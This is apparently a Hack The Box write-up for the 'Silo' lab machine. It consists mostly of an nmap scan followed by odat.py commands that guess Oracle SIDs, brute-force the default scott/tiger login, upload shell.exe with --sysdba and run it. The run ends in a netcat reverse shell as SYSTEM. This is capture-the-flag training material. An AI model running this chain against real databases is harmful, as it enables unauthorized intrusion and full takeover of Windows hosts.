---
tags: [HTB]
title: Silo
created: '2020-09-03T23:29:34.506Z'
modified: '2020-09-04T00:07:52.366Z'
---

# Silo

## Reconnaissance

```
# Nmap 7.80 scan initiated Thu Sep  3 18:05:10 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/bailey/Documents/htb/boxes/Silo/10.10.10.82/scans/_quick_tcp_nmap.txt -oX /home/bailey/Documents/htb/boxes/Silo/10.10.10.82/scans/xml/_quick_tcp_nmap.xml 10.10.10.82
Nmap scan report for 10.10.10.82
Host is up, received user-set (0.059s latency).
Scanned at 2020-09-03 18:05:10 CDT for 173s
Not shown: 989 closed ports
Reason: 989 conn-refused
PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   syn-ack Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49159/tcp open  oracle-tns   syn-ack Oracle TNS listener (requires service name)
49160/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2m47s, deviation: 0s, median: 2m47s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 24664/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 52707/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38458/udp): CLEAN (Failed to receive data)
|   Check 4 (port 27628/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-03T23:10:43
|_  start_date: 2020-09-03T23:07:54

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  3 18:08:03 2020 -- 1 IP address (1 host up) scanned in 173.38 seconds
```

Oracle TNS listener 11.2.0.2.0 seemed interesting so I checked this out first. This is vulnerable to fuzzing of accounts. Using the tool 'odat.py' we can look for the possible SID's that the OracleDB may have

```
❯ python3 odat.py sidguesser -s 10.10.10.82 -p 1521 --output-file ~/
```

```
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB
```

```
sudo python3 odat.py passwordguesser -d XE -s 10.10.10.82 -p 1521 --output-file ~/Documents/htb/boxes/Silo/odat.txt
```

```
[+] Accounts found on 10.10.10.82:1521/XE: 
scott/tiger
```

```
❯ python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ~/Documents/htb/boxes/Silo/shell.exe
```
This gives us insufficient privileges, however we can maybe circumvent it with using --sysdba

```
❯ python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ~/Documents/htb/boxes/Silo/shell.exe --sysdba

[1] (10.10.10.82:1521): Put the /home/bailey/Documents/htb/boxes/Silo/shell.exe local file in the /temp folder like shell.exe on the 10.10.10.82 server
[+] The /home/bailey/Documents/htb/boxes/Silo/shell.exe file was created on the /temp directory on the 10.10.10.82 server like the shell.exe file
```

```
❯ python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba

[1] (10.10.10.82:1521): Execute the shell.exe command stored in the /temp path
```

```
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.82] 49167
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18

```

























